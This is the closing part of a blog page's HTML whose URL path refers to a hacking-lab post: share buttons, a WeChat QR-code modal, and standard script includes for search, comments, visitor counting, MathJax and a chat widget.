          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/07/13/hackinglab/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxElEQVR42u3awY6DMAxFUf7/p6k0q1kUuM8Ohko3q4qkzSkLK7azbXjsf4Ov/L+ePFk85MqV2+bup+OIezR7RDn/TWKQK1fuPPc8eJHNyEq+5vC5XLlyX8atnUN4+JMrV+4vcvn2q16HXLlyn+WS5KfznBdKluVqcuXKbXDTgukdn2+s78qVKzfk7uHg3yK4eHe5cuWOcEmbhLda09m0zCpXrtwZLi928MsTJGkhs4chTK5cuSPcfjpESiTpmi97yZUr91FuJ7HptFsuwqVcuXLHuSQF4hc609dBdpQrV+4Ml6RAnRDW75JsPLuSK1fuIi4KHGExtHaRAv1VuXLlDnJrl6guipu4QRLsKFeu3BEu2ZLHllogkytX7tu4PDylwSsNguiAJVeu3BFu2gTlxP41jqChIleu3KVcchCpNU7IsSYNmnLlyp3kbo3RSXLi5EquXLmDXD7i0BOGsFYrRa5cuYu4aUCptWk5nc/KlSv3bi4PXum1iVqD9uLYJFeu3EFuWuaIt6lF0FpMlStX7iA3aIWCX661beTKlftObu2AsuBwI1eu3HFuWgblV7J4QkWucciVK3eGO1MwTXFy5cp9iPsBIjIGHEiCpD0AAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.1"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.1"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.1"></script>

<!-- third-party -->





<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.1"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.1"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.1"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    <script type="text/javascript">
  daovoice('init', {
    app_id: "c1ada43c"
  });
  daovoice('update');
</script>

    
</body>
</html>
